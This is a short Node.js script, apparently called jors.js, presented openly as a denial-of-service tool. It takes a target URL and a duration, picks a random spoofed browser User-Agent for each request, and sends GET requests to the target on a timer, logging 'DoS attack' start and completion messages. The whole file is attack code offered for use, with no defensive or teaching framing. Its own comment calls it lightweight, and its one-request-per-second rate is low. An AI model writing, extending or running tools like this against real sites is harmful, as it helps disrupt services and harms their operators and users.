/*
"This method cannot bypass protection; it's a very lightweight method."
*/


const https = require('https');
const http = require('http');
const url = require('url');

const target = process.argv[2];
const duration = parseInt(process.argv[3]);

if (process.argv.length < 4 || isNaN(duration)) {
    console.log('Invalid Usage: node jors.js URL DURATION.');
    process.exit(1);
}

let jors = 0;
const uaList = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.37',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Edg/91.0.864.37',
    
];

const parsedUrl = url.parse(target);
const options = {
    hostname: parsedUrl.hostname,
    port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
    path: parsedUrl.path,
    method: 'GET'
};

const makeRequest = () => {
    const ua = uaList[Math.floor(Math.random() * uaList.length)];
    options.headers = { 'User-Agent': ua };

    const protocol = parsedUrl.protocol === 'https:' ? https : http;

    const req = protocol.request(options, (res) => {
        res.on('data', (chunk) => { });
        res.on('end', () => {
            jors++;
            console.log(`Request complete. Status: ${res.statusCode}, User-Agent: ${ua}`);
        });
    });

    req.on('error', (e) => {
        console.error(`Request error: ${e.message}`);
    });

    req.end();
};

console.log(`Starting DoS attack on ${target} for ${duration} seconds...`);

const interval = setInterval(makeRequest, 1000);

setTimeout(() => {
    clearInterval(interval);
    console.log(`DoS attack completed. Total requests: ${jors}`);
}, duration * 1000);